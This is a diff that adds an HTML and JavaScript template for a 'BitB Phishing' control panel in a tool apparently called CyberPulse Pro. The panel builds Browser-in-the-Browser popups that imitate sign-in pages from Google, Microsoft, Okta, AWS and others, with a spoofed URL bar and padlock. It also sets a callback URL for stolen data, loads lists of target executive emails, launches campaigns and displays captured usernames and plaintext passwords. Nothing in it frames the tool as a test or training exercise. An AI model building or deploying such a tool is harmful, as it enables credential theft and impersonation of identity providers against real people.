@@ -1,0 +1,523 @@
+{% extends "base.html" %}
+
+{% block title %}BitB Phishing - Browser-in-the-Browser - CyberPulse Pro{% endblock %}
+
+{% block head %}
+<style>
+    .provider-card {
+        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+        border: 1px solid rgba(138, 43, 226, 0.3);
+        border-radius: 12px;
+        padding: 20px;
+        text-align: center;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+    .provider-card:hover, .provider-card.selected {
+        border-color: #8a2be2;
+        box-shadow: 0 0 25px rgba(138, 43, 226, 0.4);
+        transform: translateY(-2px);
+    }
+    .provider-icon {
+        width: 60px;
+        height: 60px;
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 10px;
+        font-size: 24px;
+    }
+    .browser-option {
+        display: flex;
+        align-items: center;
+        padding: 12px;
+        border: 1px solid #333;
+        border-radius: 8px;
+        margin-bottom: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+    .browser-option:hover, .browser-option.selected {
+        border-color: #8a2be2;
+        background: rgba(138, 43, 226, 0.1);
+    }
+    .preview-frame {
+        background: #0a0a0a;
+        border: 1px solid #333;
+        border-radius: 8px;
+        padding: 10px;
+        min-height: 400px;
+        position: relative;
+        overflow: hidden;
+    }
+    .fake-browser {
+        background: #202124;
+        border-radius: 8px;
+        overflow: hidden;
+        box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+    }
+    .fake-titlebar {
+        background: #323232;
+        padding: 8px 12px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+    .fake-buttons {
+        display: flex;
+        gap: 6px;
+    }
+    .fake-button {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+    }
+    .fake-button.close { background: #ff5f57; }
+    .fake-button.minimize { background: #febc2e; }
+    .fake-button.maximize { background: #28c840; }
+    .fake-urlbar {
+        flex: 1;
+        background: #1a1a1a;
+        border-radius: 20px;
+        padding: 6px 12px;
+        font-size: 12px;
+        display: flex;
+        align-items: center;
+        color: #888;
+    }
+    .fake-lock {
+        color: #28c840;
+        margin-right: 8px;
+    }
+    .campaign-card {
+        background: rgba(138, 43, 226, 0.1);
+        border: 1px solid rgba(138, 43, 226, 0.3);
+        border-radius: 8px;
+        padding: 15px;
+        margin-bottom: 10px;
+    }
+    .credential-row {
+        background: rgba(0, 255, 136, 0.1);
+        border: 1px solid rgba(0, 255, 136, 0.3);
+        border-radius: 6px;
+        padding: 10px;
+        margin-bottom: 8px;
+    }
+    .stats-card {
+        background: linear-gradient(135deg, rgba(138, 43, 226, 0.2) 0%, rgba(75, 0, 130, 0.2) 100%);
+        border: 1px solid rgba(138, 43, 226, 0.4);
+        border-radius: 12px;
+        padding: 20px;
+        text-align: center;
+    }
+    .stats-number {
+        font-size: 2.5rem;
+        font-weight: bold;
+        background: linear-gradient(135deg, #8a2be2, #da70d6);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="container-fluid py-4">
+    <!-- Header -->
+    <div class="row mb-4">
+        <div class="col-12">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <h1 class="text-gradient mb-2">
+                        <i class="fas fa-window-restore me-3"></i>BitB Phishing
+                    </h1>
+                    <p class="text-muted mb-0">Browser-in-the-Browser attack • Pixel-perfect fake popups 🎭</p>
+                </div>
+                <span class="badge bg-purple px-3 py-2" style="background: #8a2be2 !important;">
+                    <i class="fas fa-mask me-2"></i>SOCIAL ENGINEERING
+                </span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Stats Row -->
+    <div class="row mb-4">
+        <div class="col-md-3">
+            <div class="stats-card">
+                <div class="stats-number" id="totalCampaigns">0</div>
+                <p class="text-muted mb-0">Campaigns</p>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="stats-card">
+                <div class="stats-number" id="totalCredentials">0</div>
+                <p class="text-muted mb-0">Credentials</p>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="stats-card">
+                <div class="stats-number" id="successRate">0%</div>
+                <p class="text-muted mb-0">Success Rate</p>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="stats-card">
+                <div class="stats-number" id="activePages">0</div>
+                <p class="text-muted mb-0">Active Pages</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="row">
+        <!-- Left Column - Configuration -->
+        <div class="col-lg-5">
+            <!-- OAuth Provider Selection -->
+            <div class="card bg-dark border-secondary mb-4">
+                <div class="card-header" style="background: rgba(138, 43, 226, 0.25);">
+                    <h5 class="mb-0"><i class="fas fa-id-card me-2"></i>OAuth Provider</h5>
+                </div>
+                <div class="card-body">
+                    <div class="row" id="providerGrid">
+                        <!-- Loaded dynamically -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- Browser Type -->
+            <div class="card bg-dark border-secondary mb-4">
+                <div class="card-header bg-secondary bg-opacity-25">
+                    <h5 class="mb-0"><i class="fas fa-globe me-2"></i>Browser Style</h5>
+                </div>
+                <div class="card-body" id="browserOptions">
+                    <!-- Loaded dynamically -->
+                </div>
+            </div>
+
+            <!-- Campaign Settings -->
+            <div class="card bg-dark border-secondary mb-4">
+                <div class="card-header bg-secondary bg-opacity-25">
+                    <h5 class="mb-0"><i class="fas fa-cogs me-2"></i>Campaign Settings</h5>
+                </div>
+                <div class="card-body">
+                    <div class="mb-3">
+                        <label class="form-label">Campaign Name</label>
+                        <input type="text" class="form-control bg-dark text-white" id="campaignName" 
+                               placeholder="Q4 Executive Phishing">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Custom Window URL (Optional)</label>
+                        <input type="url" class="form-control bg-dark text-white" id="customUrl" 
+                               placeholder="https://accounts.google.com/signin">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Callback URL</label>
+                        <input type="url" class="form-control bg-dark text-white" id="callbackUrl" 
+                               placeholder="https://your-server.com/capture">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Target Emails (one per line)</label>
+                        <textarea class="form-control bg-dark text-white" id="targetEmails" rows="3" 
+                                  placeholder="ceo@target.com&#10;cfo@target.com"></textarea>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Actions -->
+            <div class="row">
+                <div class="col-6">
+                    <button class="btn btn-outline-info w-100" onclick="previewPage()">
+                        <i class="fas fa-eye me-2"></i>Preview
+                    </button>
+                </div>
+                <div class="col-6">
+                    <button class="btn w-100" style="background: #8a2be2; color: white;" onclick="generatePage()">
+                        <i class="fas fa-magic me-2"></i>Generate Page
+                    </button>
+                </div>
+            </div>
+            <button class="btn btn-success w-100 mt-3" onclick="createCampaign()">
+                <i class="fas fa-rocket me-2"></i>Launch Campaign
+            </button>
+        </div>
+
+        <!-- Right Column - Preview & Campaigns -->
+        <div class="col-lg-7">
+            <!-- Live Preview -->
+            <div class="card bg-dark border-secondary mb-4">
+                <div class="card-header bg-secondary bg-opacity-25">
+                    <h5 class="mb-0"><i class="fas fa-desktop me-2"></i>Live Preview</h5>
+                </div>
+                <div class="card-body">
+                    <div class="preview-frame" id="previewFrame">
+                        <div class="fake-browser" id="fakeBrowser">
+                            <div class="fake-titlebar">
+                                <div class="fake-buttons">
+                                    <div class="fake-button close"></div>
+                                    <div class="fake-button minimize"></div>
+                                    <div class="fake-button maximize"></div>
+                                </div>
+                                <div class="fake-urlbar">
+                                    <i class="fas fa-lock fake-lock"></i>
+                                    <span id="fakeUrl">accounts.google.com</span>
+                                </div>
+                            </div>
+                            <div style="background: white; padding: 30px; min-height: 300px;">
+                                <div class="text-center text-dark">
+                                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" 
+                                         style="max-width: 150px; margin-bottom: 20px;">
+                                    <h5>Sign in</h5>
+                                    <p class="text-muted">Use your Google Account</p>
+                                    <input type="text" class="form-control mb-3" placeholder="Email or phone">
+                                    <button class="btn btn-primary w-100">Next</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Active Campaigns -->
+            <div class="card bg-dark border-secondary mb-4">
+                <div class="card-header bg-secondary bg-opacity-25 d-flex justify-content-between">
+                    <h5 class="mb-0"><i class="fas fa-bullseye me-2"></i>Active Campaigns</h5>
+                    <button class="btn btn-sm btn-outline-secondary" onclick="loadCampaigns()">
+                        <i class="fas fa-sync me-1"></i>Refresh
+                    </button>
+                </div>
+                <div class="card-body" id="campaignsContainer">
+                    <p class="text-muted text-center">No campaigns yet</p>
+                </div>
+            </div>
+
+            <!-- Captured Credentials -->
+            <div class="card bg-dark border-secondary">
+                <div class="card-header bg-success bg-opacity-25">
+                    <h5 class="mb-0"><i class="fas fa-key me-2"></i>Captured Credentials</h5>
+                </div>
+                <div class="card-body" id="credentialsContainer" style="max-height: 300px; overflow-y: auto;">
+                    <p class="text-muted text-center">No credentials captured yet</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let selectedProvider = 'google';
+let selectedBrowser = 'chrome_windows';
+
+document.addEventListener('DOMContentLoaded', function() {
+    loadProviders();
+    loadBrowsers();
+    loadStats();
+    loadCampaigns();
+});
+
+function loadProviders() {
+    fetch('/bitb/api/providers')
+        .then(r => r.json())
+        .then(data => {
+            const grid = document.getElementById('providerGrid');
+            grid.innerHTML = data.providers.map(p => `
+                <div class="col-4 mb-3">
+                    <div class="provider-card ${p.id === 'google' ? 'selected' : ''}" 
+                         onclick="selectProvider('${p.id}', this)" data-provider="${p.id}">
+                        <div class="provider-icon" style="background: ${p.color}20;">
+                            <span style="font-size: 28px;">${p.icon}</span>
+                        </div>
+                        <small>${p.name}</small>
+                    </div>
+                </div>
+            `).join('');
+        });
+}
+
+function loadBrowsers() {
+    fetch('/bitb/api/browsers')
+        .then(r => r.json())
+        .then(data => {
+            const container = document.getElementById('browserOptions');
+            container.innerHTML = data.browsers.map(b => `
+                <div class="browser-option ${b.id === 'chrome_windows' ? 'selected' : ''}" 
+                     onclick="selectBrowser('${b.id}', this)">
+                    <span class="me-3" style="font-size: 24px;">${b.icon}</span>
+                    <span>${b.name}</span>
+                </div>
+            `).join('');
+        });
+}
+
+function selectProvider(provider, element) {
+    document.querySelectorAll('.provider-card').forEach(el => el.classList.remove('selected'));
+    element.classList.add('selected');
+    selectedProvider = provider;
+    updatePreview();
+}
+
+function selectBrowser(browser, element) {
+    document.querySelectorAll('.browser-option').forEach(el => el.classList.remove('selected'));
+    element.classList.add('selected');
+    selectedBrowser = browser;
+    updatePreview();
+}
+
+function updatePreview() {
+    const urls = {
+        'google': 'accounts.google.com/signin',
+        'microsoft': 'login.microsoftonline.com',
+        'apple': 'appleid.apple.com',
+        'github': 'github.com/login',
+        'okta': 'company.okta.com/login',
+        'aws': 'signin.aws.amazon.com',
+        'facebook': 'facebook.com/login',
+        'linkedin': 'linkedin.com/login'
+    };
+    document.getElementById('fakeUrl').textContent = urls[selectedProvider] || 'login.example.com';
+}
+
+function previewPage() {
+    fetch('/bitb/api/preview', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            provider: selectedProvider,
+            browser_type: selectedBrowser
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.html) {
+            // Could render the actual HTML preview here
+            alert('Preview generated! Check console for HTML.');
+            console.log(data.html);
+        }
+    });
+}
+
+function generatePage() {
+    const customUrl = document.getElementById('customUrl').value;
+    const callbackUrl = document.getElementById('callbackUrl').value;
+
+    fetch('/bitb/api/generate', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            provider: selectedProvider,
+            browser_type: selectedBrowser,
+            custom_url: customUrl || null,
+            callback_url: callbackUrl
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.html) {
+            // Download the HTML
+            const blob = new Blob([data.html], {type: 'text/html'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `bitb_${selectedProvider}_${Date.now()}.html`;
+            a.click();
+            alert('Phishing page generated and downloaded!');
+        } else {
+            alert('Generation failed: ' + data.error);
+        }
+    });
+}
+
+function createCampaign() {
+    const name = document.getElementById('campaignName').value;
+    const callbackUrl = document.getElementById('callbackUrl').value;
+    const targetEmails = document.getElementById('targetEmails').value.split('\n').filter(e => e.trim());
+
+    if (!name) {
+        alert('Please enter a campaign name');
+        return;
+    }
+
+    fetch('/bitb/api/campaign', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            name: name,
+            provider: selectedProvider,
+            browser_type: selectedBrowser,
+            targets: targetEmails,
+            callback_url: callbackUrl
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.campaign_id) {
+            alert('Campaign created: ' + data.campaign_id);
+            loadCampaigns();
+            loadStats();
+        } else {
+            alert('Failed: ' + data.error);
+        }
+    });
+}
+
+function loadCampaigns() {
+    fetch('/bitb/api/campaigns')
+        .then(r => r.json())
+        .then(data => {
+            const container = document.getElementById('campaignsContainer');
+            if (data.campaigns && data.campaigns.length > 0) {
+                container.innerHTML = data.campaigns.map(c => `
+                    <div class="campaign-card">
+                        <div class="d-flex justify-content-between align-items-center">
+                            <div>
+                                <strong>${c.name}</strong>
+                                <p class="text-muted mb-0 small">${c.provider} • ${c.browser}</p>
+                            </div>
+                            <div class="text-end">
+                                <span class="badge bg-success">${c.credentials_count || 0} creds</span>
+                                <button class="btn btn-sm btn-outline-info ms-2" onclick="viewCampaign('${c.id}')">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                `).join('');
+            } else {
+                container.innerHTML = '<p class="text-muted text-center">No campaigns yet</p>';
+            }
+        });
+}
+
+function loadStats() {
+    fetch('/bitb/api/stats')
+        .then(r => r.json())
+        .then(data => {
+            document.getElementById('totalCampaigns').textContent = data.total_campaigns || 0;
+            document.getElementById('totalCredentials').textContent = data.total_credentials || 0;
+            document.getElementById('successRate').textContent = (data.success_rate || 0) + '%';
+            document.getElementById('activePages').textContent = data.active_pages || 0;
+        });
+}
+
+function viewCampaign(campaignId) {
+    fetch(`/bitb/api/campaign/${campaignId}/credentials`)
+        .then(r => r.json())
+        .then(data => {
+            const container = document.getElementById('credentialsContainer');
+            if (data.credentials && data.credentials.length > 0) {
+                container.innerHTML = data.credentials.map(c => `
+                    <div class="credential-row">
+                        <div class="d-flex justify-content-between">
+                            <div>
+                                <strong>${c.username}</strong>
+                                <p class="mb-0 small text-muted">${c.password}</p>
+                            </div>
+                            <small class="text-muted">${c.captured_at}</small>
+                        </div>
+                    </div>
+                `).join('');
+            } else {
+                container.innerHTML = '<p class="text-muted text-center">No credentials captured</p>';
+            }
+        });
+}
+</script>
+{% endblock %}
